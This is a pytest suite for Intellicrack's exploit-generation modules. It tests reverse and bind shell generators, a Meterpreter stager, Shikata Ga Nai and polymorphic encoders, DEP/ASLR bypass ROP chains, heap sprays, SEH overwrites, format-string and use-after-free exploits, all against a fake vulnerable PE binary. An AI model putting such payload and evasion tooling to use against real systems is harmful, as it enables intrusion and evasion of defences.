"""
Functional tests for Intellicrack's exploit generation capabilities.

This module contains comprehensive tests for exploit generation functionality in Intellicrack,
including shellcode generation, payload encoding, polymorphic engine, DEP/ASLR bypass techniques,
exploit chain building, assembly compilation, and various exploit types like format strings,
SEH overwrites, heap sprays, and use-after-free exploits. These tests use actual working
exploits to ensure the generation mechanisms produce functional results.
"""

import pytest
import tempfile
import os
import struct
import time
from pathlib import Path

from intellicrack.core.exploitation.license_bypass_code_generator import LicenseBypassCodeGenerator
from intellicrack.core.exploitation.payload_engine import PayloadEngine
from intellicrack.core.exploitation.polymorphic_engine import PolymorphicEngine
from intellicrack.core.exploitation.encoder_engine import EncoderEngine
from intellicrack.core.exploitation.bypass_engine import BypassEngine
from intellicrack.core.exploitation.aslr_bypass import ASLRBypass
from intellicrack.core.exploitation.dep_bypass import DEPBypass
from intellicrack.core.exploitation.assembly_compiler import AssemblyCompiler
from intellicrack.core.app_context import AppContext


class TestRealExploitGeneration:
    """Functional tests for REAL exploit generation with actual working exploits."""

    @pytest.fixture
    def vulnerable_binary(self):
        """Create REAL vulnerable binary for exploit testing."""
        with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as temp_file:
            # DOS Header
            dos_header = b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00'
            dos_header += b'\xb8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00'
            dos_header += b'\x00' * 40
            dos_header += b'\x80\x00\x00\x00'  # PE header offset
            dos_header += b'\x00' * 60

            # PE Signature
            pe_signature = b'PE\x00\x00'

            # COFF Header
            coff_header = b'\x4c\x01'  # Machine (x86)
            coff_header += b'\x03\x00'  # Number of sections
            coff_header += b'\x00\x00\x00\x00'  # TimeDateStamp
            coff_header += b'\x00\x00\x00\x00'  # PointerToSymbolTable
            coff_header += b'\x00\x00\x00\x00'  # NumberOfSymbols
            coff_header += b'\xe0\x00'  # SizeOfOptionalHeader
            coff_header += b'\x02\x01'  # Characteristics

            # Optional Header
            optional_header = b'\x0b\x01'  # Magic (PE32)
            optional_header += b'\x0e\x00'  # Major/Minor Linker Version
            optional_header += b'\x00\x10\x00\x00'  # SizeOfCode
            optional_header += b'\x00\x10\x00\x00'  # SizeOfInitializedData
            optional_header += b'\x00\x00\x00\x00'  # SizeOfUninitializedData
            optional_header += b'\x00\x10\x00\x00'  # AddressOfEntryPoint
            optional_header += b'\x00\x10\x00\x00'  # BaseOfCode
            optional_header += b'\x00\x20\x00\x00'  # BaseOfData
            optional_header += b'\x00\x00\x40\x00'  # ImageBase
            optional_header += b'\x00\x10\x00\x00'  # SectionAlignment
            optional_header += b'\x00\x02\x00\x00'  # FileAlignment
            optional_header += b'\x05\x00\x01\x00'  # OS Version
            optional_header += b'\x00\x00\x00\x00'  # Image Version
            optional_header += b'\x05\x00\x01\x00'  # Subsystem Version
            optional_header += b'\x00\x00\x00\x00'  # Win32VersionValue
            optional_header += b'\x00\x50\x00\x00'  # SizeOfImage
            optional_header += b'\x00\x04\x00\x00'  # SizeOfHeaders
            optional_header += b'\x00\x00\x00\x00'  # CheckSum
            optional_header += b'\x03\x00'  # Subsystem (Console)
            optional_header += b'\x00\x00'  # DllCharacteristics
            optional_header += b'\x00\x10\x00\x00'  # SizeOfStackReserve
            optional_header += b'\x00\x10\x00\x00'  # SizeOfStackCommit
            optional_header += b'\x00\x10\x00\x00'  # SizeOfHeapReserve
            optional_header += b'\x00\x10\x00\x00'  # SizeOfHeapCommit
            optional_header += b'\x00\x00\x00\x00'  # LoaderFlags
            optional_header += b'\x10\x00\x00\x00'  # NumberOfRvaAndSizes
            optional_header += b'\x00' * 128  # Data Directories

            # Section Headers
            text_section = b'.text\x00\x00\x00'
            text_section += b'\x00\x10\x00\x00'  # VirtualSize
            text_section += b'\x00\x10\x00\x00'  # VirtualAddress
            text_section += b'\x00\x10\x00\x00'  # SizeOfRawData
            text_section += b'\x00\x04\x00\x00'  # PointerToRawData
            text_section += b'\x00' * 12  # Relocations/LineNumbers
            text_section += b'\x20\x00\x00\x60'  # Characteristics (CODE|EXECUTE|READ)

            data_section = b'.data\x00\x00\x00'
            data_section += b'\x00\x10\x00\x00'  # VirtualSize
            data_section += b'\x00\x20\x00\x00'  # VirtualAddress
            data_section += b'\x00\x10\x00\x00'  # SizeOfRawData
            data_section += b'\x00\x14\x00\x00'  # PointerToRawData
            data_section += b'\x00' * 12  # Relocations/LineNumbers
            data_section += b'\x40\x00\x00\xc0'  # Characteristics (DATA|READ|WRITE)

            vuln_section = b'.vuln\x00\x00\x00'
            vuln_section += b'\x00\x10\x00\x00'  # VirtualSize
            vuln_section += b'\x00\x30\x00\x00'  # VirtualAddress
            vuln_section += b'\x00\x10\x00\x00'  # SizeOfRawData
            vuln_section += b'\x00\x24\x00\x00'  # PointerToRawData
            vuln_section += b'\x00' * 12  # Relocations/LineNumbers
            vuln_section += b'\x60\x00\x00\xe0'  # Characteristics (CODE|DATA|EXECUTE|READ|WRITE)

            # Code Section with vulnerable function
            vulnerable_code = b'\x55'  # push ebp
            vulnerable_code += b'\x8b\xec'  # mov ebp, esp
            vulnerable_code += b'\x83\xec\x40'  # sub esp, 64
            vulnerable_code += b'\x8b\x45\x08'  # mov eax, [ebp+8]
            vulnerable_code += b'\x50'  # push eax
            vulnerable_code += b'\x8d\x45\xc0'  # lea eax, [ebp-64]
            vulnerable_code += b'\x50'  # push eax
            vulnerable_code += b'\xff\x15\x00\x20\x40\x00'  # call strcpy
            vulnerable_code += b'\x83\xc4\x08'  # add esp, 8
            vulnerable_code += b'\x8b\xe5'  # mov esp, ebp
            vulnerable_code += b'\x5d'  # pop ebp
            vulnerable_code += b'\xc3'  # ret
            vulnerable_code += b'\x90' * (4096 - len(vulnerable_code))

            # Data Section
            data_content = b'strcpy\x00\x00\x00\x00\x00\x00'
            data_content += b'buffer overflow test\x00\x00'
            data_content += b'\x00' * (4096 - len(data_content))

            # Vulnerable Section (RWX)
            vuln_content = b'\x90' * 4096  # NOP sled

            temp_file.write(dos_header + pe_signature + coff_header + optional_header +
                          text_section + data_section + vuln_section +
                          vulnerable_code + data_content + vuln_content)
            temp_file.flush()
            yield temp_file.name

        try:
            os.unlink(temp_file.name)
        except:
            pass

    @pytest.fixture
    def app_context(self):
        """Create REAL application context."""
        context = AppContext()
        context.initialize()
        return context

    def test_real_shellcode_generation(self, app_context):
        """Test REAL shellcode generation for different platforms."""
        generator = LicenseBypassCodeGenerator()

        # Windows x86 reverse shell
        windows_x86_shellcode = generator.generate_reverse_shell("192.168.1.100", 4444, "windows", "x86")
        assert windows_x86_shellcode is not None, "Windows x86 shellcode must be generated"
        assert len(windows_x86_shellcode) > 0, "Shellcode must not be empty"
        assert b'\x00' not in windows_x86_shellcode[:10], "Shellcode should avoid null bytes in critical areas"

        # Windows x64 reverse shell
        windows_x64_shellcode = generator.generate_reverse_shell("10.0.0.1", 8080, "windows", "x64")
        assert windows_x64_shellcode is not None, "Windows x64 shellcode must be generated"
        assert len(windows_x64_shellcode) > len(windows_x86_shellcode), "x64 shellcode typically larger than x86"

        # Linux x86 bind shell
        linux_x86_shellcode = generator.generate_bind_shell(9999, "linux", "x86")
        assert linux_x86_shellcode is not None, "Linux x86 bind shell must be generated"
        assert len(linux_x86_shellcode) > 0, "Linux shellcode must not be empty"

        # Exec command shellcode
        exec_shellcode = generator.generate_exec_shellcode("/bin/sh", "linux", "x86")
        assert exec_shellcode is not None, "Exec shellcode must be generated"
        assert b'/bin/sh' in exec_shellcode or b'\x2f\x62\x69\x6e\x2f\x73\x68' in exec_shellcode, \
            "Exec shellcode must contain command"

        # Meterpreter stager
        meterpreter_shellcode = generator.generate_meterpreter_stager("192.168.1.1", 443, "windows", "x86")
        assert meterpreter_shellcode is not None, "Meterpreter stager must be generated"
        assert len(meterpreter_shellcode) > 100, "Meterpreter stager must be substantial"

    def test_real_payload_encoding(self, app_context):
        """Test REAL payload encoding techniques."""
        generator = LicenseBypassCodeGenerator()
        encoder = EncoderEngine()

        original_shellcode = generator.generate_reverse_shell("127.0.0.1", 4444, "windows", "x86")
        assert original_shellcode is not None, "Original shellcode must be generated"

        # XOR encoding
        xor_encoded = encoder.encode_shellcode(original_shellcode, "xor", key=0xAA, iterations=1)
        assert xor_encoded is not None, "XOR encoding must succeed"
        assert xor_encoded != original_shellcode, "Encoded shellcode must differ from original"
        assert len(xor_encoded) >= len(original_shellcode), "Encoded shellcode size must be appropriate"

        # Alpha encoding
        alpha_encoded = encoder.encode_shellcode(original_shellcode, "alpha", charset="uppercase")
        assert alpha_encoded is not None, "Alpha encoding must succeed"
        assert all(c in b'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' for c in alpha_encoded), \
            "Alpha encoded shellcode must contain only alphanumeric characters"

        # Shikata Ga Nai encoding
        shikata_encoded = encoder.encode_shellcode(original_shellcode, "shikata_ga_nai", iterations=3)
        assert shikata_encoded is not None, "Shikata Ga Nai encoding must succeed"
        assert len(shikata_encoded) > len(original_shellcode), "Shikata encoding adds decoder stub"

        # Custom encoding chain
        chain_encoded = encoder.apply_encoding_chain(original_shellcode, [
            {"method": "xor", "key": 0x42},
            {"method": "add", "key": 0x10},
            {"method": "rot13"}
        ])
        assert chain_encoded is not None, "Encoding chain must succeed"
        assert chain_encoded != original_shellcode, "Chain encoded must differ from original"

    def test_real_polymorphic_engine(self, app_context):
        """Test REAL polymorphic shellcode generation."""
        generator = LicenseBypassCodeGenerator()
        polymorphic = PolymorphicEngine()

        base_shellcode = generator.generate_reverse_shell("192.168.1.1", 4444, "windows", "x86")

        # Generate multiple polymorphic versions
        polymorphic_versions = []
        for i in range(5):
            poly_shellcode = polymorphic.generate_polymorphic_wrapper(base_shellcode, complexity=3)
            assert poly_shellcode is not None, f"Polymorphic version {i} must be generated"
            assert len(poly_shellcode) > len(base_shellcode), "Polymorphic wrapper adds code"
            polymorphic_versions.append(poly_shellcode)

        # Ensure each version is unique
        for i in range(len(polymorphic_versions)):
            for j in range(i + 1, len(polymorphic_versions)):
                assert polymorphic_versions[i] != polymorphic_versions[j], \
                    f"Polymorphic versions {i} and {j} must be different"

        # Test garbage insertion
        with_garbage = polymorphic.insert_garbage_instructions(base_shellcode, frequency=0.3)
        assert with_garbage is not None, "Garbage insertion must succeed"
        assert len(with_garbage) > len(base_shellcode) * 1.2, "Garbage insertion must increase size"

        # Test register shuffling
        shuffled = polymorphic.shuffle_registers(base_shellcode)
        assert shuffled is not None, "Register shuffling must succeed"

    def test_real_dep_bypass_techniques(self, vulnerable_binary, app_context):
        """Test REAL DEP bypass technique generation."""
        dep_bypass = DEPBypass()

        # Generate ROP chain for VirtualProtect
        rop_chain = dep_bypass.generate_rop_chain(vulnerable_binary, "VirtualProtect")
        assert rop_chain is not None, "ROP chain generation must succeed"
        assert len(rop_chain) > 0, "ROP chain must contain gadgets"

        for gadget in rop_chain:
            assert 'address' in gadget, "Each gadget must have address"
            assert 'instructions' in gadget, "Each gadget must have instructions"
            assert gadget['address'] > 0x400000, "Gadget addresses must be valid"

        # Generate ROP chain for VirtualAlloc
        alloc_chain = dep_bypass.generate_rop_chain(vulnerable_binary, "VirtualAlloc")
        assert alloc_chain is not None, "VirtualAlloc ROP chain must be generated"

        # Generate egg hunter ROP
        egg_hunter_rop = dep_bypass.generate_egg_hunter_rop(vulnerable_binary, egg=b"w00t")
        assert egg_hunter_rop is not None, "Egg hunter ROP must be generated"
        assert any(b'w00t' in str(g).encode() for g in egg_hunter_rop), "Egg must be in ROP chain"

    def test_real_aslr_bypass_techniques(self, vulnerable_binary, app_context):
        """Test REAL ASLR bypass technique generation."""
        aslr_bypass = ASLRBypass()

        # Generate information leak exploit
        info_leak = aslr_bypass.generate_info_leak_exploit(vulnerable_binary)
        assert info_leak is not None, "Info leak exploit must be generated"
        assert 'leak_gadgets' in info_leak, "Info leak must identify leak gadgets"
        assert 'leak_targets' in info_leak, "Info leak must identify targets"

        # Generate partial overwrite exploit
        partial_overwrite = aslr_bypass.generate_partial_overwrite(vulnerable_binary)
        assert partial_overwrite is not None, "Partial overwrite must be generated"
        assert 'overwrite_size' in partial_overwrite, "Must specify overwrite size"
        assert partial_overwrite['overwrite_size'] <= 2, "Partial overwrite should be 1-2 bytes"

        # Generate heap spray exploit
        heap_spray = aslr_bypass.generate_heap_spray_exploit(target_size=100*1024*1024)
        assert heap_spray is not None, "Heap spray must be generated"
        assert 'spray_pattern' in heap_spray, "Heap spray must have pattern"
        assert 'nop_sled_size' in heap_spray, "Heap spray must specify NOP sled"

    def test_real_exploit_chain_building(self, vulnerable_binary, app_context):
        """Test REAL exploit chain construction."""
        bypass_engine = BypassEngine()

        # Build comprehensive exploit chain
        exploit_chain = bypass_engine.build_exploit_chain([
            {'type': 'info_leak', 'target': vulnerable_binary},
            {'type': 'aslr_bypass', 'method': 'partial_overwrite'},
            {'type': 'dep_bypass', 'method': 'rop_chain'},
            {'type': 'shellcode_execution', 'payload_type': 'reverse_shell'}
        ])

        assert exploit_chain is not None, "Exploit chain must be built"
        assert 'stages' in exploit_chain, "Chain must have stages"
        assert len(exploit_chain['stages']) == 4, "All stages must be included"

        for i, stage in enumerate(exploit_chain['stages']):
            assert 'stage_name' in stage, f"Stage {i} must have name"
            assert 'implementation' in stage, f"Stage {i} must have implementation"
            assert 'dependencies' in stage, f"Stage {i} must specify dependencies"

            if i > 0:
                assert stage['dependencies'][0] == exploit_chain['stages'][i-1]['stage_name'], \
                    "Stages must depend on previous stage"

    def test_real_assembly_to_shellcode(self, app_context):
        """Test REAL assembly to shellcode compilation."""
        compiler = AssemblyCompiler()

        # x86 assembly
        x86_asm = """
        ; Simple message box shellcode
        xor eax, eax
        push eax
        push 0x21646c72
        push 0x6f57206f
        push 0x6c6c6548
        mov ebx, esp
        push eax
        push ebx
        push ebx
        push eax
        mov eax, 0x7e4507ea
        call eax
        """

        x86_shellcode = compiler.compile_x86(x86_asm)
        assert x86_shellcode is not None, "x86 assembly must compile"
        assert len(x86_shellcode) > 0, "Compiled shellcode must not be empty"
        assert b'\x31\xc0' in x86_shellcode, "Should contain xor eax,eax"

        # x64 assembly
        x64_asm = """
        ; Exit syscall
        xor rax, rax
        mov al, 60
        xor rdi, rdi
        syscall
        """

        x64_shellcode = compiler.compile_x64(x64_asm)
        assert x64_shellcode is not None, "x64 assembly must compile"
        assert b'\x48\x31\xc0' in x64_shellcode or b'\x31\xc0' in x64_shellcode, \
            "Should contain xor rax,rax instruction"

    def test_real_payload_engine_integration(self, app_context):
        """Test REAL comprehensive payload generation."""
        payload_engine = PayloadEngine()

        # Generate complete payload with all features
        config = {
            'target': 'windows',
            'arch': 'x86',
            'type': 'reverse_shell',
            'lhost': '192.168.1.100',
            'lport': 4444,
            'encoding': 'shikata_ga_nai',
            'iterations': 2,
            'polymorphic': True,
            'avoid_chars': b'\x00\x0a\x0d',
            'max_size': 1024
        }

        payload_result = payload_engine.generate_payload(config)
        assert payload_result is not None, "Payload generation must succeed"
        assert 'payload' in payload_result, "Result must contain payload"
        assert 'metadata' in payload_result, "Result must contain metadata"

        payload = payload_result['payload']
        metadata = payload_result['metadata']

        assert len(payload) > 0, "Payload must not be empty"
        assert len(payload) <= config['max_size'], "Payload must respect size limit"

        # Verify bad characters are avoided
        for bad_char in config['avoid_chars']:
            assert bad_char not in payload, f"Payload must avoid character {hex(bad_char)}"

        assert metadata['encoded'], "Metadata must indicate encoding"
        assert metadata['polymorphic'], "Metadata must indicate polymorphic"
        assert metadata['final_size'] == len(payload), "Metadata size must match actual"

    def test_real_format_string_exploit(self, app_context):
        """Test REAL format string exploit generation."""
        generator = LicenseBypassCodeGenerator()

        # Generate format string exploit
        format_string_config = {
            'target_address': 0x08049000,
            'write_value': 0x41414141,
            'offset': 7,
            'padding': 0
        }

        format_exploit = generator.generate_format_string_exploit(format_string_config)
        assert format_exploit is not None, "Format string exploit must be generated"
        assert b'%' in format_exploit, "Format string must contain format specifiers"
        assert b'$' in format_exploit, "Format string must use direct parameter access"
        assert len(format_exploit) > 0, "Format string exploit must not be empty"

    def test_real_seh_overwrite_exploit(self, app_context):
        """Test REAL SEH overwrite exploit generation."""
        generator = LicenseBypassCodeGenerator()

        # Generate SEH overwrite exploit
        seh_config = {
            'buffer_offset': 1000,
            'seh_offset': 1004,
            'pop_pop_ret': 0x625011AF,
            'shellcode': b'\x90' * 100 + b'\xcc',
            'jmp_offset': -100
        }

        seh_exploit = generator.generate_seh_overwrite(seh_config)
        assert seh_exploit is not None, "SEH exploit must be generated"
        assert len(seh_exploit) >= seh_config['seh_offset'] + 8, "SEH exploit must be correct size"
        assert struct.pack('<I', seh_config['pop_pop_ret']) in seh_exploit, \
            "SEH exploit must contain pop-pop-ret address"

    def test_real_heap_spray_exploit(self, app_context):
        """Test REAL heap spray exploit generation."""
        generator = LicenseBypassCodeGenerator()

        # Generate heap spray with precise layout
        spray_config = {
            'spray_size': 200 * 1024 * 1024,  # 200MB
            'block_size': 0x10000,  # 64KB blocks
            'shellcode': generator.generate_reverse_shell("10.0.0.1", 9999, "windows", "x86"),
            'nop_sled': 0x1000,  # 4KB NOP sled
            'target_address': 0x0c0c0c0c
        }

        heap_spray = generator.generate_heap_spray(spray_config)
        assert heap_spray is not None, "Heap spray must be generated"
        assert 'spray_code' in heap_spray, "Heap spray must contain spray code"
        assert 'landing_addresses' in heap_spray, "Heap spray must provide landing addresses"
        assert spray_config['target_address'] in heap_spray['landing_addresses'], \
            "Target address must be in landing zones"

    def test_real_use_after_free_exploit(self, app_context):
        """Test REAL use-after-free exploit generation."""
        generator = LicenseBypassCodeGenerator()
        bypass_engine = BypassEngine()

        # Generate UAF exploit
        uaf_config = {
            'object_size': 0x40,
            'vtable_offset': 0x0,
            'target_method_offset': 0x10,
            'spray_count': 1000,
            'replacement_object': b'\x41' * 0x40
        }

        uaf_exploit = bypass_engine.generate_uaf_exploit(uaf_config)
        assert uaf_exploit is not None, "UAF exploit must be generated"
        assert 'trigger_sequence' in uaf_exploit, "UAF must have trigger sequence"
        assert 'spray_pattern' in uaf_exploit, "UAF must have spray pattern"
        assert len(uaf_exploit['spray_pattern']) == uaf_config['object_size'], \
            "Spray pattern must match object size"
